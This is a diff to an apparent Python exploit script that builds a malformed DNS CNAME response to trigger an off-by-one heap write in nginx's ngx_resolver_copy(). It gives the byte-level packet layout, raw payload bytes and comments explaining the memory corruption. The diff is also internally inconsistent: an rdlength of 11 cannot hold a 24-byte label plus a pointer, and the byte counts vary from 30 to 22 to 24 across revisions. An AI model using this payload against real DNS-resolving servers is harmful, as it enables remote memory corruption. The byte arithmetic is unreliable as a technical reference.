@@ -43,9 +43,9 @@ def build_malicious_response(query: bytes) -> bytes:
       [flags 0x8180][QD=1 AN=1 NS=0 AR=0]
       [question echoed up to & incl. null, + qtype + qclass]
       [answer name = 0xC0 0x0C  -> pointer to the question name]
-      [type A (0x0001)][class IN (0x0001)][ttl 0x00000E10]
+      [type CNAME (0x0005)][class IN (0x0001)][ttl 0x00000E10]
       [rdlength 0x000B]
-      [rdata: 0x18 (label len 24) + 30*'A' + compression pointer 0xC0 0x04]
+      [rdata: 0x18 (label len 24) + 24*'A' + compression pointer 0xC0 0x04]
 
     The mismatch between the declared label length (0x18 = 24) and the trailing
     compression pointer (0xC0 0x04, pointing INTO the 12-byte header) makes the
@@ -68,9 +68,10 @@ def build_malicious_response(query: bytes) -> bytes:
 
     # CNAME answer header: name ptr 0xC00C, type CNAME (0x0005), class IN, ttl
     ans_hdr = b"\xC0\x0C\x00\x05\x00\x01\x00\x00\x0E\x10"
-    # rdlength 0x000B then RDATA: label-len 0x18 (declares 24) but only 22 'A'
-    # bytes follow, terminated by compression pointer 0xC0 0x04 (into header).
-    # The length/pointer mismatch is what drives ngx_resolver_copy() off-by-one.
+    # rdlength 0x000B then RDATA: label-len 0x18 (24) followed by 24 'A' bytes,
+    # then a compression pointer 0xC0 0x04 (into the 12-byte header). The
+    # compression-pointer chase in ngx_resolver_copy() miscomputes where the
+    # terminating NUL lands and writes it one byte past the allocation.
     rdata = (
         b"\x00\x0B\x18\x41\x41\x41\x41\x41\x41\x41"
         b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
